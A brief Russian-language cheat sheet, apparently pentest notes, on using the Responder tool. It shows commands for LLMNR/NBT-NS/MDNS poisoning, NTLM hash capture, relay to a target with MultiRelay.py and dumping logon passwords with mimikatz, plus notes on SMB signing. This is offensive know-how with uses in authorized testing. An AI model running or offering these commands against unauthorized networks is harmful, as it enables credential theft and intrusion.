# Responder

### Intro

Responder — это травитель LLMNR, NBT-NS (Netbios Name Service) и MDNS со встроенным мошенническим сервером HTTP/SMB/MSSQL/FTP/LDAP аутентификации, поддерживающим NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP и Basic HTTP аутентификацию.

Это инструмент для поднятия серверов своих и проведения атак.

## Установка

$ apt-get install responder&#x20;

или git: [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

Из git все норм запускается без зависимостей (вроде).

## Использование

Перед запуском правим `Responder.conf`

### Через бинарь

Включить в режиме прослушивания: `responder -I eth0 -A` \
Включить в режиме poising (травим пакеты): `responder -I eth0 -wrFb`

### Через python

```
sudo python Responder.py -I eth0 -A
sudo python Responder.py -I eth0 -w -r -F -b
```

### Pass-the-Hash

После того как словили хеш, можем либо брутануть, либо relay-атаку на сторонний сервис провести, авторизуясь по перехваченному хешу (SMB signing дб отключен):\
В Responder.conf переставляем SMB и HTTP в OFF\
Запускаем `$ responder -I eth0`\
Запускаем \`$ python [MultiRelay.py](http://multirelay.py) -t \<IP target> -u ALL\`\
Ждем, пока жертва запросит доступ к третьему ресурсу -> вместо нее авторизуемся мы.

Фишка MultiRelay, что она даст не просто сессию, а сессию с доп модулями. Например:\
`mimikatz: #mimi sekurlsa::logonpasswords`\
Поиск других жертв: `#scan /16`

Замечания:\
\- Для MultiRelay пользователь-жертва, чьи креды используем, должен быть локальным администратором на том компе, что мы атакуем\
\- Если включен SMB signing - то забиваем и переходим к другому хосту. NTLM-relay не выйдет. \
\
Нюансы: \
почему не включают SMB signing: \
1\. Некоторые принтеры не поддерживают SMB-signing, что приводит к невозможности печати. \
2\. Значительное снижение производительности SMB при передаче больших файлов или множественному обращению к одному и тому же серверу несколькими пользователями
